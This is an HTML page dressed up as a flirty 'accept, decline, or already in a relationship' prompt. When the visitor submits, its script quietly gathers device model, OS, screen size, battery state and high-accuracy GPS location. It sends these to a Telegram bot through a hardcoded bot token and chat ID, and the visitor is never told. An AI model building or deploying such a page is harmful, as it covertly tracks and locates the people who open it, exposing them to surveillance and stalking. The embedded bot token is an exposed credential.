<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YOUR OPTIONS</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #4b0082, #ff4500, #8a2be2, #00ffff);
            background-size: 400% 400%;
            animation: gradientBG 8s ease infinite;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: white;
            overflow: hidden;
        }

        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .container {
            text-align: center;
            padding: 3rem;
            border-radius: 20px;
            backdrop-filter: blur(20px);
            background: rgba(0, 0, 0, 0.6);
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
            animation: glow 3s infinite alternate;
        }

        @keyframes glow {
            from { box-shadow: 0 0 20px #ff00ff; }
            to { box-shadow: 0 0 40px #00ffff; }
        }

        h1 {
            font-size: 2rem;
            margin-bottom: 2rem;
            background: linear-gradient(90deg, #ff00ff, #00ffff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .option {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            gap: 1rem;
            margin: 1rem 0;
        }

        input[type="checkbox"] {
            appearance: none;
            width: 25px;
            height: 25px;
            border: 2px solid #ff00ff;
            border-radius: 50%;
            cursor: pointer;
        }

        input[type="checkbox"]:checked {
            background: linear-gradient(45deg, #ff00ff, #00ffff);
        }

        label {
            font-size: 1.5rem;
            cursor: pointer;
            user-select: none;
        }

        .submit-btn {
            margin-top: 2rem;
            padding: 1rem 3rem;
            font-size: 1.5rem;
            color: white;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            background: linear-gradient(90deg, #ff00ff, #00ffff);
            transition: all 0.3s;
        }

        .submit-btn:hover {
            transform: scale(1.1);
            box-shadow: 0 0 30px #00ffff;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>SELECT AN OPTION, OR IT WILL NEVER CHANGE</h1>
        <div class="option">
            <input type="checkbox" id="accept" name="choice" onclick="selectOnlyOne(this)">
            <label for="accept">ACCEPT ✅</label>
        </div>
        <div class="option">
            <input type="checkbox" id="decline" name="choice" onclick="selectOnlyOne(this)">
            <label for="decline">DECLINE ❌</label>
        </div>
        <div class="option">
            <input type="checkbox" id="someoneElse" name="choice" onclick="selectOnlyOne(this)">
            <label for="someoneElse">ALREADY IN RELATIONSHIP 🙂</label>
        </div>
        <button class="submit-btn" onclick="submitData()">SUBMIT</button>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = "7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4";
        const CHAT_ID = "5112680061";

        function selectOnlyOne(selectedCheckbox) {
            document.querySelectorAll('input[type="checkbox"]').forEach(checkbox => {
                if (checkbox !== selectedCheckbox) checkbox.checked = false;
            });
        }

        async function getDeviceInfo() {
            let deviceInfo = "📱 **Device Info:**\n";
            
            if (navigator.userAgentData) {
                const ua = await navigator.userAgentData.getHighEntropyValues(["architecture", "model", "platform", "platformVersion"]);
                deviceInfo += `🔹 **Device Model:** ${ua.model || "Unknown"}\n`;
                deviceInfo += `🔹 **OS:** ${ua.platform} ${ua.platformVersion}\n`;
                deviceInfo += `🔹 **Architecture:** ${ua.architecture || "Unknown"}\n`;
            } else {
                deviceInfo += `🔹 **OS:** ${navigator.platform}\n`;
            }

            deviceInfo += `🔹 **Screen:** ${window.screen.width}x${window.screen.height}\n`;

            return deviceInfo;
        }

        function getSelectedOption() {
            const checkboxes = document.querySelectorAll('input[type="checkbox"]');
            for (let checkbox of checkboxes) {
                if (checkbox.checked) return checkbox.nextElementSibling.innerText;
            }
            return null;
        }

        async function submitData() {
            const option = getSelectedOption();
            if (!option) return alert("Please select an option!");

            navigator.getBattery().then(battery => {
                const batteryStatus = `🔋 **Battery:** ${Math.floor(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})`;
                
                getDeviceInfo().then(deviceInfo => {
                    const message = `✅ **User Response**\n🟢 **Option:** ${option}\n${deviceInfo}${batteryStatus}`;
                    sendMessage(message);
                });

                captureLocation(option);
            });
        }

        function captureLocation(option) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => sendMessage(`📍 **Location:** Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`),
                    () => sendMessage("📍 **Location:** Not Available"),
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            }
        }

        function sendMessage(text) {
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: "Markdown" })
            });
        }
    </script>
</body>
</html>
